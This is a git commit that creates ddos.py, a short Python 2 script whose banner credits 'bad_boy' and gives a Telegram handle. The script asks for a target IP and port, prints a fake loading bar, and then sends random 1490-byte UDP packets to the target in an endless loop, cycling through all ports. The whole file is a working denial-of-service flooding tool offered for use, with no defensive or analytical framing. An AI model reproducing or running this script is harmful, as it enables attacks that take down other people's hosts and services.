a240d339c772438fd1ea610e895f6f2122c77abc
joker192 <73433769+joker192@users.noreply.github.com>
2020-11-19 12:39:25 +0330

    Create ddos.py

---
+++ ddos.py
@@ -0,0 +1,42 @@
+import sys
+import os
+import time
+import socket
+import random
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+os.system("clear")
+os.system("toilet -f mono12 -F gay DDOS")
+print "==================================="
+print "          made by bad_boy"
+print "  my telegram id: @Bad_boy_468"
+print "==================================="
+target = raw_input("Enter Target Ip : ")
+port = input("Enter Your Port : ")
+os.system("clear")
+os.system("toilet -f mono12 -F gay STARTED!")
+print "LOADING[+++]"
+time.sleep(3)
+print "LOADING[+++++]10%"
+time.sleep(3)
+print "LOADING[++++++++]30%"
+time.sleep(3)
+print "LOADING[+++++++++++]70%"
+time.sleep(3)
+print "LOADING[++++++++++++++]100%"
+time.sleep(2)
+sent = 0
+while True:
+     sock.sendto(bytes, (target,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s target port:%s"%(sent,target,port)
+     if port == 65534:
+       port = 1
